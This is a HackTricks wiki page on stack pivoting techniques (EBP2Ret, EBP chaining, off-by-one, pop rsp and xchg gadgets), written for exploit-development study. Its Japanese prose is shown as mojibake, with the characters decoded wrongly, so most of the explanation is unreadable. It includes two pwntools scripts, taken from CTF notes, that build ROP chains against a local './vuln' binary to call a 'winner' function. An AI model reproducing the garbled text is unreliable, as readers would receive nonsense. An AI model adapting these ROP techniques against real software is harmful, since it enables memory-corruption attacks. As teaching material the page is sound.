# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

ã“ã®æŠ€è¡“ã¯ã€**ãƒ™ãƒ¼ã‚¹ãƒã‚¤ãƒ³ã‚¿ï¼ˆEBPï¼‰**ã‚’æ“ä½œã™ã‚‹èƒ½åŠ›ã‚’åˆ©ç”¨ã—ã¦ã€EBPãƒ¬ã‚¸ã‚¹ã‚¿ã¨`leave; ret`å‘½ä»¤ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’æ…é‡ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€è¤‡æ•°ã®é–¢æ•°ã®å®Ÿè¡Œã‚’é€£é–ã•ã›ã¾ã™ã€‚

ãŠã•ã‚‰ã„ã¨ã—ã¦ã€**`leave`**ã¯åŸºæœ¬çš„ã«æ¬¡ã®ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼š
```
mov               esp, ebp
pop               ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

ã“ã®æŠ€è¡“ã¯ã€**EBPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹ãŒã€EIPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ç›´æ¥å¤‰æ›´ã™ã‚‹æ–¹æ³•ãŒãªã„å ´åˆ**ã«ç‰¹ã«æœ‰ç”¨ã§ã™ã€‚ã“ã‚Œã¯ã€é–¢æ•°ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹éš›ã®å‹•ä½œã‚’åˆ©ç”¨ã—ã¾ã™ã€‚

ã‚‚ã—ã€`fvuln`ã®å®Ÿè¡Œä¸­ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã‚ã‚‹ãƒ¡ãƒ¢ãƒªé ˜åŸŸã‚’æŒ‡ã™**å½ã®EBP**ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ï¼ˆ`pop`æ“ä½œã®ãŸã‚ã«4ãƒã‚¤ãƒˆã‚’åŠ ç®—ï¼‰ã€EIPã‚’é–“æ¥çš„ã«åˆ¶å¾¡ã§ãã¾ã™ã€‚`fvuln`ãŒæˆ»ã‚‹ã¨ã€ESPã¯ã“ã®ä½œæˆã•ã‚ŒãŸä½ç½®ã«è¨­å®šã•ã‚Œã€ãã®å¾Œã®`pop`æ“ä½œã§ESPãŒ4æ¸›å°‘ã—ã€**æ”»æ’ƒè€…ãŒãã“ã«ä¿å­˜ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã“ã¨ã«ãªã‚Šã¾ã™ã€‚**\
ã“ã“ã§ã€**2ã¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™**: ESPãŒå‘ã‹ã†ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã€ESPãŒæŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€å¿…è¦ãŒã‚ã‚‹å ´æ‰€ã§ã™ã€‚

#### Exploit Construction

ã¾ãšã€**ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿/ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ESPã¯ã“ã“ã‚’æŒ‡ã—ã€**æœ€åˆã®`ret`ã‚’å®Ÿè¡Œã—ã¾ã™**ã€‚

æ¬¡ã«ã€**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹`ret`ãŒä½¿ç”¨ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ä½¿ç”¨ã§ãã¾ã™ï¼š

* æœ‰åŠ¹ãª[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)ã‚¢ãƒ‰ãƒ¬ã‚¹ã€‚
* **`system()`**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¾Œã«**4ãƒã‚¤ãƒˆã®ã‚¸ãƒ£ãƒ³ã‚¯**ã¨`"/bin/sh"`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆx86ãƒ“ãƒƒãƒˆï¼‰ã€‚
* **`jump esp;`**ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ[**ret2esp**](ret2esp-ret2reg.md)ï¼‰ã®å¾Œã«**å®Ÿè¡Œã™ã‚‹ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰**ã€‚
* ä¸€éƒ¨ã®[**ROP**](rop-return-oriented-programing.md)ãƒã‚§ãƒ¼ãƒ³ã€‚

ã“ã‚Œã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å‰ã«ã¯ã€åˆ¶å¾¡ã•ã‚ŒãŸãƒ¡ãƒ¢ãƒªéƒ¨åˆ†ã«**`4`ãƒã‚¤ãƒˆ**ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã¯**`pop`**éƒ¨åˆ†ã®`leave`å‘½ä»¤ã®ãŸã‚ã§ã™ã€‚ã“ã‚Œã‚‰ã®4ãƒã‚¤ãƒˆã‚’æ‚ªç”¨ã—ã¦**2ã¤ç›®ã®å½EBP**ã‚’è¨­å®šã—ã€å®Ÿè¡Œã‚’åˆ¶å¾¡ã—ç¶šã‘ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

#### Off-By-One Exploit

ã“ã®æŠ€è¡“ã®ç‰¹å®šã®ãƒãƒªã‚¢ãƒ³ãƒˆã¯ã€ŒOff-By-One Exploitã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€**EBPã®æœ€ä¸‹ä½ãƒã‚¤ãƒˆã®ã¿ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆ**ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®å ´åˆã€**`ret`**ã§ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ ¼ç´ã™ã‚‹ãƒ¡ãƒ¢ãƒªä½ç½®ã¯EBPã¨æœ€åˆã®3ãƒã‚¤ãƒˆã‚’å…±æœ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã‚ˆã‚Šåˆ¶ç´„ã®ã‚ã‚‹æ¡ä»¶ã§é¡ä¼¼ã®æ“ä½œãŒå¯èƒ½ã§ã™ã€‚

### **EBP Chaining**

ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ã®`EBP`ã‚¨ãƒ³ãƒˆãƒªã«åˆ¶å¾¡ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç½®ãã€`EIP`ã«`leave; ret`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç½®ãã“ã¨ã§ã€**ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰åˆ¶å¾¡ã•ã‚ŒãŸ`EBP`ã‚¢ãƒ‰ãƒ¬ã‚¹ã«`ESP`ã‚’ç§»å‹•ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚

ä»Šã€**`ESP`**ã¯åˆ¶å¾¡ã•ã‚Œã€æœ›ã¾ã—ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã¦ãŠã‚Šã€æ¬¡ã«å®Ÿè¡Œã•ã‚Œã‚‹å‘½ä»¤ã¯`RET`ã§ã™ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€åˆ¶å¾¡ã•ã‚ŒãŸESPã®å ´æ‰€ã«æ¬¡ã®ã‚‚ã®ã‚’ç½®ãã“ã¨ãŒã§ãã¾ã™ï¼š

* **`&(next fake EBP)`** -> `leave`å‘½ä»¤ã‹ã‚‰ã®`pop ebp`ã«ã‚ˆã‚Šæ–°ã—ã„EBPã‚’ãƒ­ãƒ¼ãƒ‰
* **`system()`** -> `ret`ã«ã‚ˆã£ã¦å‘¼ã³å‡ºã•ã‚Œã‚‹
* **`&(leave;ret)`** -> systemãŒçµ‚äº†ã—ãŸå¾Œã«å‘¼ã³å‡ºã•ã‚Œã€ESPã‚’å½EBPã«ç§»å‹•ã•ã›ã€å†ã³é–‹å§‹
* **`&("/bin/sh")`**-> `system`ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

åŸºæœ¬çš„ã«ã€ã“ã®æ–¹æ³•ã§è¤‡æ•°ã®å½EBPã‚’é€£é–ã•ã›ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ•ãƒ­ãƒ¼ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã“ã‚Œã¯[ret2lib](ret2lib/)ã®ã‚ˆã†ãªã‚‚ã®ã§ã™ãŒã€æ˜ã‚‰ã‹ãªåˆ©ç‚¹ã¯ãªãã€ç‰¹å®šã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã§èˆˆå‘³æ·±ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã•ã‚‰ã«ã€ã“ã“ã«[**ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã®ä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ãŒã‚ã‚Šã€ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦**ã‚¹ã‚¿ãƒƒã‚¯ãƒªãƒ¼ã‚¯**ã‚’åˆ©ç”¨ã—ã¦å‹åˆ©é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ã“ã‚Œã¯ãƒšãƒ¼ã‚¸ã‹ã‚‰ã®æœ€çµ‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBPã¯ç„¡æ„å‘³ã§ã‚ã‚‹

[**ã“ã®æŠ•ç¨¿ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1)ã€ãƒã‚¤ãƒŠãƒªãŒæœ€é©åŒ–ã•ã‚Œã¦ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã‚‹ã¨ã€**EBPã¯ESPã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ããªã„**ã€‚ã—ãŸãŒã£ã¦ã€EBPã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦æ©Ÿèƒ½ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯åŸºæœ¬çš„ã«å¤±æ•—ã™ã‚‹ã€‚ãªãœãªã‚‰ã€ãã‚Œã«ã¯å®Ÿéš›ã®åŠ¹æœãŒãªã„ã‹ã‚‰ã§ã‚ã‚‹ã€‚\
ã“ã‚Œã¯ã€**ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°ã¨ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°ãŒ**ãƒã‚¤ãƒŠãƒªãŒæœ€é©åŒ–ã•ã‚Œã‚‹ã¨å¤‰æ›´ã•ã‚Œã‚‹ãŸã‚ã§ã‚ã‚‹ã€‚

* **æœ€é©åŒ–ã•ã‚Œã¦ã„ãªã„:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **æœ€é©åŒ–ã•ã‚ŒãŸ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSPã‚’åˆ¶å¾¡ã™ã‚‹ä»–ã®æ–¹æ³•

### **`pop rsp`** ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

[**ã“ã®ãƒšãƒ¼ã‚¸**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)ã§ã¯ã€ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸä¾‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€2ã¤ã®ç‰¹å®šã®å¼•æ•°ã‚’æŒã¤é–¢æ•°ã‚’å‘¼ã³å‡ºã™å¿…è¦ãŒã‚ã‚Šã€**`pop rsp` ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ãŒã‚ã‚Šã€**ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ã®ãƒªãƒ¼ã‚¯**ãŒã‚ã‚Šã¾ã™ï¼š
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp ã‚¬ã‚¸ã‚§ãƒƒãƒˆ
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
## å‚è€ƒæ–‡çŒ®

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
